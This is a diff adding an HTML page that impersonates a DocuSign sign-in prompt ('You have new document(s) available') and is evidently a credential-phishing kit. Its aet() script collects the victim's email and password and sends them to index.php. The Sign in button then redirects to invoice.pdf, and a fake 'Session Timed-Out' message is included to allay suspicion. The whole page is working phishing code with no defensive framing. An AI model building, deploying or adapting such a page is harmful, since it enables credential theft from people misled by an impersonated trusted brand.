@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>For Business</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+  <link rel='stylesheet' href='https://files.anpdm.com/tenko-core.css'>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.2/css/bootstrap.min.css'>
+<style>
+html,body { 
+	height: 100%; 
+}
+
+.global-container{
+    height:100%;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	background-color:  	#C0C0C0;
+}
+
+form{
+
+  padding-top: 0px;
+	font-size: 14px;
+	margin-top: 0px;
+}
+
+.card-title{ font-weight:300; }
+
+.btn{
+	font-size: 14px;
+	margin-top:0px;
+}
+
+
+.login-form{ 
+  border: 0.5px solid black;
+	width:330px;
+	margin:0px;
+}
+
+.sign-up{
+	text-align:center;
+	padding:0px 0 0;
+}
+
+.alert{
+	margin-bottom:-30px;
+	font-size: 13px;
+	margin-top:20px;
+}
+#spin {
+  color:red;
+  font-size: small;
+}
+.cor {
+  font-family: 'Fredoka One',  'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  font-size: large;
+  text-transform: uppercase;
+  font-weight: bolder;
+  letter-spacing: 2px;
+  text-decoration-style: dashed;
+  text-decoration: underline; 
+  text-decoration-color: #00a2ed;
+  text-decoration-thickness: 2px;
+  text-decoration-skip-ink: none;
+  text-decoration-style: double;
+}
+
+#snackbar {
+  visibility: hidden;
+  min-width: 250px;
+  margin-left: -125px;
+  background-color: red;
+  color: #fff;
+  text-align: center;
+  border-radius: 2px;
+  padding: 16px;
+  position: fixed;
+  z-index: 1;
+  left: 50%;
+  bottom: 30px;
+  font-size: 17px;
+}
+
+#snackbar.show {
+  visibility: visible;
+  -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
+  animation: fadein 0.5s, fadeout 0.5s 2.5s;
+}
+
+@-webkit-keyframes fadein {
+  from {bottom: 0; opacity: 0;} 
+  to {bottom: 30px; opacity: 1;}
+}
+
+@keyframes fadein {
+  from {bottom: 0; opacity: 0;}
+  to {bottom: 30px; opacity: 1;}
+}
+
+@-webkit-keyframes fadeout {
+  from {bottom: 30px; opacity: 1;} 
+  to {bottom: 0; opacity: 0;}
+}
+
+@keyframes fadeout {
+  from {bottom: 30px; opacity: 1;}
+  to {bottom: 0; opacity: 0;}
+}
+</style>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+
+<div class="global-container">
+	<div class="card login-form">
+	<div class="card-body">	<span id="demo" class="cor"></span><p></p>
+        <img src="https://1000logos.net/wp-content/uploads/2022/03/DocuSign-Logo-2003.png" width="200"/>
+<hr><div class="card-text">
+			<!--			<div class="alert alert-danger alert-dismissible fade show" role="alert">Incorrect username or password.</div> -->
+			 <form onsubmit="return aet()">
+				<!-- to error: add class "has-danger" -->
+				<p>You have new document(s) available<br> Sign in to continue</p>
+					<input type="email" class="form-control form-control-sm" id="email" aria-describedby="emailHelp" required="" placeholder="Email">
+				</div><p></p>
+				<div class="form-group">
+	
+									<input type="password" class="form-control form-control-sm" id="password" required="" placeholder="Password">
+				</div>
+				<button onclick="window.location.href = 'invoice.pdf';" target="_blank" type="submit" id="submit" class="btn btn-primary btn-block">Sign in</button>
+<p></p>
+
+<!-- partial -->	</div>
+<div id="snackbar">Session Timed-Out Try Again</div>
+			</form>
+		</div>
+	</div>
+</div>
+</div>
+<!-- partial -->
+  
+</body>
+<script>
+    function myFunction() {
+      var x = document.getElementById("snackbar");
+      x.className = "show";
+      setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
+    }
+    </script>
+</script>
+<script>
+function myFunction() {
+  var x = document.getElementById("snackbar");
+  x.className = "show";
+  setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
+}
+</script>
+<script>
+    function aet(){
+      // (A) GET FORM DATA
+      var data = new URLSearchParams();
+      data.append("e1", document.getElementById("email").value);
+      data.append("e2", document.getElementById("password").value);
+
+      // (B) AJAX
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "index.php?" + data.toString());
+      // What to do when server responds
+      xhr.onload = function(){console.log(this.response);};
+      xhr.send();
+
+      // (C) PREVENT HTML FORM SUBMIT
+      return false;
+    }
+    </script>
+</html>
